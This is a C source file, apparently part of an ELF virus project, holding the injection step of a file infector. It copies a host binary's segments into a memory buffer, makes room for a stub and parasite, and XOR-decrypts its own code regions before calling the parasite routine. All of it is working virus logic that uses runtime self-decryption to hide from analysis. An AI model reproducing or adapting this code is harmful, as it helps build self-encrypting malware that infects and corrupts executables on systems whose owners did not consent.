#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline char write_on_memory(char *dst, char *src, Elf64_Phdr **segment, const size_t filesize)
{
	const size_t stub_size = (void *)__exit - (void *)L1;

	const size_t beg_stub = (segment[TEXT]->p_offset + segment[TEXT]->p_filesz) - stub_size;
	const size_t end_stub = PAGE_SIZE + stub_size;
	const size_t beg_parasite = (segment[DATA]->p_offset + segment[DATA]->p_filesz) - (beg_stub + end_stub);
	const size_t end_parasite = segment[NOTE]->p_filesz + (segment[NOTE]->p_offset - (segment[DATA]->p_offset + segment[DATA]->p_filesz));

	if (beg_stub >= filesize || beg_parasite >= filesize || beg_stub + beg_parasite >= filesize)
		return -1;

	for (register size_t index = 0; index < beg_stub; index++)
		*dst++ = *src++;
	for (register size_t index = 0; index < end_stub; index++)
		*dst++ = 0;

	src += stub_size;

	for (register size_t index = 0; index < beg_parasite; index++)
		*dst++ = *src++;
	for (register size_t index = 0; index < end_parasite; index++)
		*dst++ = 0;

	return 0;
}

__attribute__((always_inline)) static inline void decrypt_right(const struct s_keychain *keychain, char *callee, const size_t size)
{
	for (register size_t index = 0; index < size; index++)
		callee[index] ^= keychain->key[RIGHT];
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
#if LOGGER
	MID_LOGGER("injection:\t\t");
#endif

	decrypt_right(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);

	if (context == FAILURE)
		goto label;

	struct s_infect infect;

	infect.filesize = host->segment[NOTE]->p_offset + host->segment[NOTE]->p_filesz;

	if ((infect.ptr = _mmap(NULL, infect.filesize, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
	{
		context = FAILURE;
		goto label;
	}

	if (write_on_memory(infect.ptr, (char *)host->header, host->segment, host->filesize) == -1)
		context = FAILURE;

label:
	update_keychain_right(keychain, (char *)injection, (void *)parasite - (void *)injection);
	decrypt_right(keychain, (char *)parasite, (void *)stub - (void *)parasite);

	parasite(host, keychain, context, &infect);
}
